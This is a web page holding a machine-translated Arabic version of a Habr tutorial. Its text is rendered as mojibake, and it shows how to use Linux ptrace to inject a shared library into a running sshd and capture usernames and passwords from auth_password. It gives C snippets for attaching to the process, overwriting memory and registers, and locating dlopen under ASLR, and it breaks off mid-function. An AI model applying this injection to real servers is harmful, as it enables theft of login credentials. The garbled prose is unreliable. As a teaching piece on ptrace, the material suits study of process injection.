<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐คฆ๐ป ๐ช ๐ ููุฏูุฉ ุนู ptrace ุฃู ุฅุฏุฎุงู ุงูุฑูุฒ ูู sshd ูู ุฃุฌู ุงููุชุนุฉ โ๐ฟ ๐ธ๐ฟ ๐</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูุงู ุงููุฏู ุงูุฐู ุญุฏุฏุชู ุจุณูุทูุง ุฌุฏูุง: ููุนุฑูุฉ ูููุฉ ุงููุฑูุฑ ุงูุชู ุชู ุฅุฏุฎุงููุง ูู sshd ุจุงุณุชุฎุฏุงู ptrace. ุจุงูุทุจุน ุ ูุฐู ูููุฉ ูุตุทูุนุฉ ุฅูู ุญุฏ ูุง ุ ูุธุฑูุง ููุฌูุฏ ุงูุนุฏูุฏ ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ููุฏูุฉ ุนู ptrace ุฃู ุฅุฏุฎุงู ุงูุฑูุฒ ูู sshd ูู ุฃุฌู ุงููุชุนุฉ</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430302/" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  ูุงู ุงููุฏู ุงูุฐู ุญุฏุฏุชู ุจุณูุทูุง ุฌุฏูุง: ููุนุฑูุฉ ูููุฉ ุงููุฑูุฑ ุงูุชู ุชู ุฅุฏุฎุงููุง ูู sshd ุจุงุณุชุฎุฏุงู ptrace.  ุจุงูุทุจุน ุ ูุฐู ูููุฉ ูุตุทูุนุฉ ุฅูู ุญุฏ ูุง ุ ูุธุฑูุง ููุฌูุฏ ุงูุนุฏูุฏ ูู ุงูุทุฑู ุงูุฃุฎุฑู ุงูุฃูุซุฑ ูุนุงููุฉ ูุชุญููู ูุง ุชุฑูุฏ (ููุน ุงุญุชูุงู ุฃูู ุจูุซูุฑ ููุญุตูู ุนูู <abbr title="ุฎุทุฃ ุชุฌุฒุฆุฉ">SEGV</abbr> ) ุ ููุน ุฐูู ุ ุจุฏุง ุงูุฃูุฑ ุฑุงุฆุนูุง ุจุงููุณุจุฉ ูู ููููุงู ุจุฐูู. <br><a name="habracut"></a><br><h1 style=";text-align:right;direction:rtl">  ูุง ูู ptraceุ </h1><br>  ุฃููุฆู ุงูุฐูู ูู ุนูู ุฏุฑุงูุฉ ุจุงูุญูู ุนูู Windows ุฑุจูุง ูุนุฑููู ุงููุธุงุฆู <code>VirtualAllocEx()</code> ู <code>WriteProcessMemory()</code> ู <code>ReadProcessMemory()</code> ู <code>CreateRemoteThread()</code> .  ุชุชูุญ ูู ูุฐู ุงูููุงููุงุช ุชุฎุตูุต ุงูุฐุงูุฑุฉ ูุจุฏุก ุณูุงุณู ุงูุฑุณุงุฆู ูู ุนูููุฉ ุฃุฎุฑู.  ูู ุนุงูู ููููุณ ุ ุชููุฑ ููุง ุงูููุงุฉ <code>ptrace</code> ุ ูุงูุชู <code>ptrace</code> ุงูุชูุงุนู ูุน ุนูููุฉ ุงูุชุดุบูู. <br><br>  ุชูุฏู Ptrace ุงูุนุฏูุฏ ูู ุนูููุงุช ุงูุชุตุญูุญ ุงููููุฏุฉ ุ ุนูู ุณุจูู ุงููุซุงู: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  PTRACE_ATTACH - ูุณูุญ ูู ุจุงูุงูุถูุงู ุฅูู ุนูููุฉ ูุงุญุฏุฉ ุนู ุทุฑูู ุฅููุงู ุนูููุฉ ุชุตุญูุญ ุงูุฃุฎุทุงุก ูุคูุชูุง </li><li style=";text-align:right;direction:rtl">  PTRACE_PEEKTEXT - ูุณูุญ ูู ุจูุฑุงุกุฉ ุงูุจูุงูุงุช ูู ูุณุงุญุฉ ุงูุนููุงู ูุนูููุฉ ุฃุฎุฑู </li><li style=";text-align:right;direction:rtl">  PTRACE_POKETEXT - ูุณูุญ ูู ุจูุชุงุจุฉ ุงูุจูุงูุงุช ุฅูู ูุณุงุญุฉ ุงูุนููุงู ูุนูููุฉ ุฃุฎุฑู </li><li style=";text-align:right;direction:rtl">  PTRACE_GETREGS - ููุฑุฃ ุงูุญุงูุฉ ุงูุญุงููุฉ ูุณุฌูุงุช ุงูุนูููุฉ </li><li style=";text-align:right;direction:rtl">  PTRACE_SETREGS - ูุณุฌู ุญุงูุฉ ุชุณุฌููุงุช ุงูุนูููุฉ </li><li style=";text-align:right;direction:rtl">  PTRACE_CONT - ูุชุงุจุนุฉ ุชูููุฐ ุนูููุฉ ุงูุชุตุญูุญ </li></ul><br>  ุนูู ุงูุฑุบู ูู ุฃู ูุฐู ููุณุช ูุงุฆูุฉ ูุงููุฉ ุจููุฒุงุช ptrace ุ ุฅูุง ุฃููู ูุงุฌูุช ุตุนูุจุงุช ุจุณุจุจ ููุต ุงููุธุงุฆู ุงููุฃูููุฉ ูู ูู Win32.  ุนูู ุณุจูู ุงููุซุงู ุ ูู ูุธุงู ุงูุชุดุบูู Windows ุ ููููู ุชุฎุตูุต ุฐุงูุฑุฉ ูู ุนูููุฉ ุฃุฎุฑู ุจุงุณุชุฎุฏุงู ูุธููุฉ <code>VirtualAllocEx()</code> ุ ูุงูุชู ุชููู ุจุฅุฑุฌุงุน ูุคุดุฑ ุฅูู ุงูุฐุงูุฑุฉ ุงููุฎุตุตุฉ ุญุฏูุซูุง.  ูุธุฑูุง ูุฃู ูุฐุง ุบูุฑ ููุฌูุฏ ูู ptrace ุ ูุฌุจ ุนููู ุงูุงุฑุชุฌุงู ุฅุฐุง ููุช ุชุฑุบุจ ูู ุชุถููู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงูุฎุงุตุฉ ุจู ูู ุนูููุฉ ุฃุฎุฑู. <br><br>  ุญุณููุง ุ ุฏุนูุง ูููุฑ ูู ููููุฉ ุงูุชุญูู ูู ุนูููุฉ ุจุงุณุชุฎุฏุงู ptrace. <br><br><h1 style=";text-align:right;direction:rtl">  ุฃุณุงุณูุงุช Ptrace </h1><br>  ุฃูู ุดูุก ูุฌุจ ุนูููุง ุงูููุงู ุจู ูู ุงูุงูุถูุงู ุฅูู ุงูุนูููุฉ ุงูุชู ุชูููุง.  ููููุงู ุจุฐูู ุ ูุง ุนููู ุณูู ุงุณุชุฏุนุงุก ptrace ุจุงุณุชุฎุฏุงู ุงููุนููุฉ PTRACE_ATTACH: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  ูุฐู ุงูููุงููุฉ ุจุณูุทุฉ ูุซู ุงุฒุฏุญุงู ุญุฑูุฉ ุงููุฑูุฑ ุ ููู ุชูุจู PID ููุนูููุฉ ุงูุชู ูุฑูุฏ ุงูุงูุถูุงู ุฅูููุง.  ุนูุฏ ุฅุฌุฑุงุก ููุงููุฉ ุ ูุชู ุฅุฑุณุงู ุฅุดุงุฑุฉ SIGSTOP ุ ููุง ููุฑุถ ุชููู ุนูููุฉ ุงูุงูุชูุงู. <br><br>  ุจุนุฏ ุงูุงูุถูุงู ุ ููุงู ุณุจุจ ูุญูุธ ุญุงูุฉ ุฌููุน ุงูุณุฌูุงุช ูุจู ุฃู ูุจุฏุฃ ูู ุชุบููุฑ ุดูุก ูุง.  ุณูุชูุญ ููุง ุฐูู ุงุณุชุนุงุฏุฉ ุงูุจุฑูุงูุฌ ูุงุญููุง: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  ุจุนุฏ ุฐูู ุ ุชุญุชุงุฌ ุฅูู ุงูุนุซูุฑ ุนูู ููุงู ูููููุง ููู ูุชุงุจุฉ ุฑูุฒูุง.  ุฃุณูู ุทุฑููุฉ ูู ุงุณุชุฎุฑุงุฌ ุงููุนูููุงุช ูู ููู ุงูุฎุฑุงุฆุท ุ ูุงูุชู ูููู ุงูุนุซูุฑ ุนูููุง ูู procfs ููู ุนูููุฉ.  ุนูู ุณุจูู ุงููุซุงู ุ ูุจุฏู "/ proc / PID / Maps" ูู ุนูููุฉ sshd ููุฏ ุงูุชุดุบูู ุนูู Ubuntu ููุง ููู: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  ูุญู ุจุญุงุฌุฉ ุฅูู ุงูุนุซูุฑ ุนูู ูุณุงุญุฉ ุงูุฐุงูุฑุฉ ุงููุฎุตุตุฉ ูุน ุงูุญู ูู ุงูุชูููุฐ (ุนูู ุงูุฃุฑุฌุญ "r-xp").  ุจูุฌุฑุฏ ุงูุนุซูุฑ ุนูู ุงูููุทูุฉ ุงูุชู ุชูุงุณุจูุง ุ ุนู ุทุฑูู ุงูููุงุณ ูุน ุงูุณุฌูุงุช ุ ูุญูุธ ุงููุญุชููุงุช ุ ุญุชู ูุชููู ูุงุญููุง ูู ุงุณุชุนุงุฏุฉ ุงูุนูู ุจุดูู ุตุญูุญ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  ุจุงุณุชุฎุฏุงู ptrace ุ ููููู ูุฑุงุกุฉ ูููุฉ ูุงุญุฏุฉ ูู ุจูุงูุงุช ุงูุฌูุงุฒ (32 ุจุช ูู x86 ุฃู 64 ุจุช ูู x86_64) ุนูู ุงูุนููุงู ุงููุญุฏุฏ ุ ุฃู ููุฑุงุกุฉ ุงููุฒูุฏ ูู ุงูุจูุงูุงุช ุ ุชุญุชุงุฌ ุฅูู ุฅุฌุฑุงุก ุนุฏุฉ ููุงููุงุช ุ ูุฒูุงุฏุฉ ุงูุนููุงู. <br><br>  <i>ููุงุญุธุฉ: ูู ููููุณ ุ ููุฌุฏ ุฃูุถูุง process_vm_readv () ู process_vm_writev () ููุนูู ูุน ูุณุงุญุฉ ุงูุนููุงู ูุนูููุฉ ุฃุฎุฑู.</i>  <i>ููุน ุฐูู ุ ูู ูุฐู ุงูููุงูุฉ ุณูู ุชูุชุฒู ุจุงุณุชุฎุฏุงู ptrace.</i>  <i>ุฅุฐุง ููุช ุชุฑูุฏ ุงูููุงู ุจุดูุก ูุฎุชูู ุ ููู ุงูุฃูุถู ุฃู ุชูุฑุฃ ุนู ูุฐู ุงููุธุงุฆู.</i> <br><br>  ุงูุขู ุจุนุฏ ุฃู ูููุง ุจุนูู ูุณุฎุฉ ุงุญุชูุงุทูุฉ ูู ูุณุงุญุฉ ุงูุฐุงูุฑุฉ ุงูุชู ูุญุจูุง ุ ูููููุง ุงูุจุฏุก ูู ุงููุชุงุจุฉ ููู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  ูุซู PTRACE_PEEKTEXT ุ ูููู ููุฐู ุงูููุงููุฉ ุชุณุฌูู ูููุฉ ุขููุฉ ูุงุญุฏุฉ ููุท ูู ูู ูุฑุฉ ุนูู ุงูุนููุงู ุงููุญุฏุฏ.  ุฃูุถูุง ุ ุชุชุทูุจ ูุชุงุจุฉ ุฃูุซุฑ ูู ูููุฉ ุขููุฉ ูุงุญุฏุฉ ููุงููุงุช ูุซูุฑุฉ. <br><br>  ุจุนุฏ ุชุญููู ุงูุฑูุฒ ุงูุฎุงุต ุจู ุ ุชุญุชุงุฌ ุฅูู ููู ุงูุชุญูู ุฅููู.  ุญุชู ูุง ูุชู ุงุณุชุจุฏุงู ุงูุจูุงูุงุช ูู ุงูุฐุงูุฑุฉ (ุนูู ุณุจูู ุงููุซุงู ุ ุงูููุฏุณ) ุ ุณูุณุชุฎุฏู ุงูุณุฌูุงุช ุงููุญููุธุฉ ูุณุจููุง: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  ุฃุฎูุฑูุง ุ ูููููุง ูุชุงุจุนุฉ ุงูุชูููุฐ ุจุงุณุชุฎุฏุงู PTRACE_CONT: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  ูููู ููู ููุง ุฃู ูุนูู ุฃู ููุฏูุง ุงูุชูู ูู ุงูุชูููุฐุ  ุณูุณุชุฎุฏู ููุงุทุนุฉ ุงูุจุฑูุงูุฌ ุ ูุงููุนุฑููุฉ ุฃูุถูุง ุจุฅุฑุดุงุฏุงุช "int 0x03" ุงูุชู ุชูุดุฆ SIGTRAP.  ุณููุชุธุฑ ูุฐุง ูุน waitpid (): <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid () - ููุงููุฉ ุญุธุฑ ุณุชูุชุธุฑ ุญุชู ุชุชููู ุงูุนูููุฉ ุจูุนุฑู PID ูุชูุชุจ ุณุจุจ ุงูุชููู ุฅูู ูุชุบูุฑ ุงูุญุงูุฉ.  ููุง ุ ุจุงูููุงุณุจุฉ ุ ููุงู ูุฌููุนุฉ ูู ูุญุฏุงุช ุงููุงูุฑู ุงูุชู ุณุชุจุณุท ุงูุญูุงุฉ ูู ูุนุฑูุฉ ุณุจุจ ุงูุชููู. <br><br>  ููุนุฑูุฉ ูุง ุฅุฐุง ูุงู ููุงู ุชููู ุจุณุจุจ SIGTRAP (ุจุณุจุจ ุงุณุชุฏุนุงุก int 0x03) ุ ูููููุง ุงูููุงู ุจุฐูู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  ูู ูุฐู ุงููุฑุญูุฉ ุ ุชู ุจุงููุนู ุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุงููุถููุฉ ูุฏููุง ููู ูุง ูุญุชุงุฌ ุฅูู ูุนูู ูู ุฅุนุงุฏุฉ ุงูุนูููุฉ ุฅูู ุญุงูุชูุง ุงูุฃุตููุฉ.  ุงุณุชุนุงุฏุฉ ูุงูุฉ ุงูุณุฌูุงุช: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  ุซู ุณูุนูุฏ ุงูุจูุงูุงุช ุงูุฃุตููุฉ ูู ุงูุฐุงูุฑุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  ูุงููุทุน ุนู ุงูุนูููุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  ูุฐู ูุธุฑูุฉ ูุงููุฉ.  ุฏุนูุง ููุชูู ุฅูู ุงูุฌุฒุก ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู. <br><br><h1 style=";text-align:right;direction:rtl">  ุญูู Sshd </h1><br>  <i>ูุฌุจ ุฃู ุฃุญุฐุฑ ูู ูุฌูุฏ ูุฑุตุฉ ูุฅุณูุงุท sshd ุ ูุฐุง ูู ุญุฐุฑูุง ูุฑุฌุงุกู ูุง ุชุญุงูู ุงูุชุญูู ูู ุฐูู ุนูู ูุธุงู ุนูู ูุฎุงุตุฉ ุนูู ูุธุงู ุจุนูุฏ ุนุจุฑ SSH: D</i> <i><br><br></i>  <i>ุนูุงูุฉ ุนูู ุฐูู ุ ููุงู ุงูุนุฏูุฏ ูู ุงูุทุฑู ุงูุฃูุถู ูุชุญููู ููุณ ุงููุชูุฌุฉ ุ ุฃููู ุจุนุฑุถ ูุฐู ุงูุทุฑููุฉ ุญุตุฑููุง ูุทุฑููุฉ ููุชุนุฉ ูุฅุธูุงุฑ ููุฉ ptrace (ุชูุงูู ุนูู ุฃู ูุฐุง ุฃูุถู ูู ุงูุญูู ูู Hello World ุ)</i> <br><br>  ุงูุดูุก ุงููุญูุฏ ุงูุฐู ุฃุฑุฏุช ุงูููุงู ุจู ูู ุงูุญุตูู ุนูู ุชุฑููุจุฉ ุชุณุฌูู ุงูุฏุฎูู ููููุฉ ุงููุฑูุฑ ูู ุชุดุบูู sshd ุนูุฏูุง ุชุชู ูุตุงุฏูุฉ ุงููุณุชุฎุฏู.  ุนูุฏ ุนุฑุถ ุดูุฑุฉ ุงููุตุฏุฑ ุ ูููููุง ุฑุคูุฉ ุดูุก ูุซู ูุฐุง: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  ูุจุฏู ุฃูู ููุงู ุฑุงุฆุน ููุญุงููุฉ ุฅุฒุงูุฉ ุงุณู ุงููุณุชุฎุฏู / ูููุฉ ุงููุฑูุฑ ุงูุชู ุฃุฑุณููุง ุงููุณุชุฎุฏู ุจูุต ูุงุถุญ. <br><br>  ูุฑูุฏ ุงูุนุซูุฑ ุนูู ุชูููุน ุฏุงูุฉ ุชุณูุญ ููุง ุจุฅูุฌุงุฏ [ูุธููุชูุง] ูู ุงูุฐุงูุฑุฉ.  ุฃุณุชุฎุฏู ุฃุฏุงุฉ ุงูุชูููู ุงูููุถูุฉ ุ radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  ูู ุงูุถุฑูุฑู ุงูุนุซูุฑ ุนูู ุณูุณูุฉ ูู ูุญุฏุงุช ุงูุจุงูุช ุงููุฑูุฏุฉ ูุงูุชู ุชุญุฏุซ ููุท ูู ุฏุงูุฉ auth_password.  ููููุงู ุจุฐูู ุ ุณูู ูุณุชุฎุฏู ุงูุจุญุซ ูู radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  ุญุฏุซ ุฃู ุชุณูุณู <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> ููุงุฆู ูุชุทูุจุงุชูุง ูููุฌุฏ ูุฑุฉ ูุงุญุฏุฉ ููุท ูู ููู ELF ุจุฃูููู. <br><br>  ูููุงุญุธุฉ ... ุฅุฐุง ูู ููู ูุฏูู ูุฐุง ุงูุชุณูุณู ุ ูุชุฃูุฏ ูู ุฃู ูุฏูู ุฃุญุฏุซ ุฅุตุฏุงุฑ ุ ูุงูุฐู <a href="">ูุบูู</a> ุฃูุถูุง ุถุนู ููุชุตู 2016. (ูู ุงูุฅุตุฏุงุฑ 7.6 ุ ูุฐุง ุงูุชุณูุณู ูุฑูุฏ ุฃูุถูุง - ุชูุฑูุจูุง ููู.) <br><br>  ุงูุฎุทูุฉ ุงูุชุงููุฉ ูู ุญูู ุงูููุฏ. <br><br><h1 style=";text-align:right;direction:rtl">  ุชูุฒูู .so ุฅูู sshd </h1><br>  ูุชุญููู ุงูููุฏ ุงูุฎุงุต ุจูุง ุฅูู sshd ุ ุณูููู ุจุนูู ูุนุจ ุฑูุชูู ุตุบูุฑ ูุณูุญ ููุง ุจุงุณุชุฏุนุงุก dlopen () ูุชุญููู ููุชุจุฉ ุฏููุงููููุฉ ุณุชููุฐ ุจุงููุนู ุงุณุชุจุฏุงู "auth_password". <br><br>  dlopen () ูู ุงุณุชุฏุนุงุก ููุงุฑุชุจุงุท ุงูุฏููุงูููู ุ ูุฃุฎุฐ ุงููุณุงุฑ ุฅูู ุงูููุชุจุฉ ุงูุฏููุงููููุฉ ูู ุงููุณูุทุงุช ููุญูููุง ูู ูุณุงุญุฉ ุงูุนููุงู ูุนูููุฉ ุงูุงุณุชุฏุนุงุก.  ุชูุฌุฏ ูุฐู ุงููุธููุฉ ูู libdl.so ุ ุงูุฐู ูุฑุชุจุท ุฏููุงูููููุง ุจุงูุชุทุจูู. <br><br>  ูุญุณู ุงูุญุธ ุ ูู ุญุงูุชูุง ุ ุชู ุชุญููู libdl.so ุจุงููุนู ูู sshd ุ ูุฐุง ุนูููุง ููุท ุชูููุฐ dlopen ().  ููุน ุฐูู ุ ุจุณุจุจ <abbr title="ุงูุนููุงู ุงูุนุดูุงุฆู ุชุฎุทูุท ุงููุถุงุก">ASLR ุ ูู ุบูุฑ</abbr> ุงููุญุชูู ุฌุฏูุง ุฃู ูููู dlopen () ูู ููุณ ุงูููุงู ูู ูู ูุฑุฉ ุ ูุฐูู ูุฌุจ ุนููู ุงูุนุซูุฑ ุนูู ุนููุงูู ูู ุฐุงูุฑุฉ sshd. <br><br>  ูู ุฃุฌู ุงูุนุซูุฑ ุนูู ุนููุงู ุงููุธููุฉ ุ ุชุญุชุงุฌ ุฅูู ุญุณุงุจ ุงูุฅุฒุงุญุฉ - ุงููุฑู ุจูู ุนููุงู ูุธููุฉ dlopen () ูุนููุงู ุงูุจุฏุก libdl.so: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  ุงูุขู ุจุนุฏ ุฃู ูููุง ุจุญุณุงุจ ุงูุฅุฒุงุญุฉ ุ ูุญุชุงุฌ ุฅูู ุงูุนุซูุฑ ุนูู ุนููุงู ุงูุจุฏุงูุฉ ูู libdl.so ูู ููู ุงูุฎุฑุงุฆุท: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  ุจูุนุฑูุฉ ุงูุนููุงู ุงูุฃุณุงุณู ูู libdl.so ูู sshd (0x7f0490a0d000 ุ ุนูู ุงููุญู ุงูุชุงูู ูู ููุทุฉ ุงูุดุงุดุฉ ุฃุนูุงู) ุ ูููููุง ุฅุถุงูุฉ ุฅุฒุงุญุฉ ูุงูุญุตูู ุนูู ุงูุนููุงู dlopen () ููุงุชุตุงู ูู ุฑูุฒ ุงูุญูู. <br><br>  ุณููุฑุฑ ุฌููุน ุงูุนูุงููู ุงููุงุฒูุฉ ูู ุฎูุงู ุงูุณุฌูุงุช ุจุงุณุชุฎุฏุงู PTRACE_SETREGS. <br><br>  ูู ุงูุถุฑูุฑู ุฃูุถูุง ูุชุงุจุฉ ุงููุณุงุฑ ุฅูู ุงูููุชุจุฉ ุงููุฒุฑูุนุฉ ูู ูุณุงุญุฉ ุนููุงู sshd ุ ุนูู ุณุจูู ุงููุซุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span 